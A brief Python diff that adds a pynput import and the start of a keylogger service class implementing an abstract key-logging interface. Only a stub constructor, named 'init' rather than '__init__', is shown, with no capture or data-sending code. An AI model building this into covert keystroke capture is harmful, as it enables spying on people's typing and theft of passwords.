@@ -1,3 +1,4 @@
+from pynput import keyboard
 from typing import List
 from abc import ABC, abstractmethod
 
@@ -13,3 +14,8 @@ class IKeyLogger(ABC):
     @abstractmethod
     def get_logged_keys(self) -> List[str]:
         pass
+
+class KeyLoggerService(IKeyLogger):
+    def init(self):
+        self.logged_keys = []
+        self.listener = None
